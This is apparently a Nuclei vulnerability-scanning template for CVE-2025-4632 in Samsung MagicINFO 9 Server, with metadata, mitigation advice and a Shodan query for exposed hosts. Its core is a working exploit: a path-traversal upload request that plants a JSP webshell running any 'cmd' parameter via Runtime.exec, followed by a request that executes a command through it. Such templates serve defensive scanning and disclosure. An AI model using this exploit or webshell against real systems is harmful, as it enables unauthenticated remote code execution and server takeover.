id: CVE-2025-4632

info:
  name: Samsung MagicINFO 9 Server - Unauthenticated Path Traversal to RCE
  author: intelligent-ears
  severity: critical
  description: |
    Samsung MagicINFO 9 Server (< 21.1052) contains an unauthenticated path traversal vulnerability
    in the /MagicInfo/servlet/SWUpdateFileUploader endpoint. Attackers can upload arbitrary JSP
    files (webshells) and achieve remote code execution on the server.
  references:
    - https://github.com/MantisToboggan-git/CVE-2025-4632-POC
    - https://nvd.nist.gov/vuln/detail/CVE-2025-4632
    - https://ssd-disclosure.com/ssd-advisory-samsung-magicinfo-unauthenticated-rce/
  classification:
    cve-id: CVE-2025-4632
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cpe: cpe:/a:samsung:magicinfo_server:9.0.0
  tags: cve,cve2025,samsung,magicinfo,rce,path-traversal
  mitigation: |
    Upgrade to Samsung MagicINFO Server >= 21.1052.
    Restrict access to /MagicInfo/servlet/SWUpdateFileUploader and validate file uploads.

variables:
  rand_filename: "test_{{randstr}}.jsp"

http:
  - raw:
      - |
        POST /MagicInfo/servlet/SWUpdateFileUploader?fileName=./../../../../../../server/{{rand_filename}}&deviceType=exploit&deviceModelName=exploit&swVer=123 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain

        <%@ page import="java.util.*,java.io.*"%>
        <pre><%
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while (disr != null) {
          out.println(disr);
          disr = dis.readLine();
        }
        %></pre>

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "MagicINFO"

  - method: GET
    path:
      - "/MagicInfo/server/{{rand_filename}}?cmd=echo%20CVE-2025-4632-SUCCESS"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "CVE-2025-4632-SUCCESS"
    extractors:
      - type: regex
        name: server_version
        part: header
        regex:
          - '(?i)Server: (MagicINFO[^\r\n]+)'

max-request: 2

metadata:
  verified: false
  bounty: true
  bounty_url: https://github.com/projectdiscovery/nuclei-templates/issues/12946
  shodan-query: 'server: "MagicINFO Premium Server"'
